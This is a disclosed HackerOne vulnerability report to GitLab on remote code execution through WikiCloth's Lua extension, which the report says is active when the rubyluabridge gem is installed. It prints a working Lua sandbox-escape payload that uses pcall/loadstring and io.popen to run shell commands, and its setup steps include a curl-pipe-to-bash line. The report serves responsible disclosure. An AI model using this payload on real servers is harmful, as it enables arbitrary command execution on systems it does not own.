# RCE via WikiCloth markdown rendering if the `rubyluabridge` gem is installed

## Report Details
- **Report ID**: 1401444
- **URL**: https://hackerone.com/reports/1401444
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2021-11-16T11:32:27.651Z
- **Disclosed**: 2022-04-12T10:10:28.476Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

One of the supported wiki formats is `mediawiki` which is rendered by `WikiCloth` via GitLab Markup:

https://gitlab.com/gitlab-org/gitlab-markup/-/blob/v1.7.1/lib/github/markups.rb#L24-28
```ruby
markup(:wikicloth, /mediawiki|wiki/) do |content|
  wikicloth = WikiCloth::WikiCloth.new(:data => content)
  WikiCloth::WikiBuffer::HTMLElement::ESCAPED_TAGS << 'tt'
  wikicloth.to_html(:noedit => true)
end
```

One of the extensions that `WikiCloth` has is for lua (eg [lua.wiki](https://github.com/nricciar/wikicloth/blob/v0.8.1/sample_documents/lua.wiki)), which allows lua code to be run and the results rendered inside of the page by using either `{{#luaexpr:lua expression}}` or `<lua>lua code here</lua>`. This extension is enabled if the `rubyluabridge` gem can be required:

https://github.com/nricciar/wikicloth/blob/v0.8.1/lib/wikicloth/extensions/lua.rb#L1-L6
```ruby
begin
  require 'rubyluabridge'
  DISABLE_LUA = false
rescue LoadError
  DISABLE_LUA = true
end
```

The lua code is meant to be executed in a sandbox, but looking at the [lua wiki on sandboxing](http://lua-users.org/wiki/SandBoxes#:~:text=loadstring%20--%20UNSAFE.%20See%20load.%20Even%20this%3A) one of the things mentioned is:

> loadstring -- UNSAFE. See load. Even this isn't safe. For example, `pcall(safeloadstring, some_script)` will load some_script in global environment. --SergeyRozhenko

```lua
local oldloadstring = loadstring
local function safeloadstring(s, chunkname)
  local f, message = oldloadstring(s, chunkname)
  if not f then
    return f, message
  end
  setfenv(f, getfenv(2))
  return f
end
```

This is the exact code that `WikiCloth` is using in their wrapper https://github.com/nricciar/wikicloth/blob/master/lib/wikicloth/extensions/lua/luawrapper.lua#L83-L92, so the provided bypass can be used to execute arbitrary lua:

```
<lua>
_,execute = pcall(loadstring,
    [[
        local command = ...;
        local handle = io.popen(command)
        local result = handle:read("*a")
        handle:close()
        return result;
    ]]
);

print(execute('id'));
execute('echo vakzz > /tmp/ggg');
</lua>
```

Luckily it's pretty unlikely that the `rubyluabridge` gem will be installed. There is a current ubuntu package https://packages.ubuntu.com/bionic/ruby/ruby-luabridge that can just be installed with apt, or a rubygem version at https://rubygems.org/gems/Tamar. Potentially another gem could start depending on it, or if gitlab is [installed from source](https://docs.gitlab.com/ee/install/installation.html) and the ruby environment is shared, the apt version could be present.

### Steps to reproduce

1. Install the `rubyluabridge` gem
  * If using the omnibus edition then you will need to do something like the following to get it in the correct spot:
```
curl -sSL https://get.rvm.io | bash
source /etc/profile.d/rvm.sh
rvm install 2.7.4

git clone https://github.com/neomantra/rubyluabridge
sudo apt install liblua5.1-0-dev libboost-dev
./build/extconf_ubuntu.sh
make

sudo cp rubyluabridge.so /opt/gitlab/embedded/lib/ruby/2.7.0/rubyluabridge.so
```
2. Create a new project and add a wiki page
3. Clone the wiki (clone url should end in `.wiki.git`)
4. Create a file `hello.wiki` with the following contents:
```
<lua>
_,execute = pcall(loadstring,
    [[
        local command = ...;
        local handle = io.popen(command)
        local result = handle:read("*a")
        handle:close()
        return result;
    ]]
);

print(execute('id'));
execute('echo vakzz > /tmp/ggg');
</lua>
```
5. Add, commit and push the file
6. Visit the new wiki page on gitlab, you should see the output of the `id` command
7. See that the file `/tmp/ggg` has been created

{F1515535}

### Impact
If the `rubyluabridge` gem has been manually installed, or if another gem starts depending on it, a user with the ability to add wiki pages can run arbitrary commands on the gitlab server 

### What is the current *bug* behavior?
The lua sandbox can be escaped using code from the official wiki.

### What is the expected *correct* behavior?
Probably all of the WikiCloth extensions should be disabled unless explicitly enabled, I cant really see a need for executing lua when rendering a wiki page.

### Output of checks
#### Results of GitLab environment info

## Impact

If the `rubyluabridge` gem has been manually installed, or if another gem starts depending on it, a user with the ability to add wiki pages can run arbitrary commands on the gitlab server

## Attachments
- wiki.png
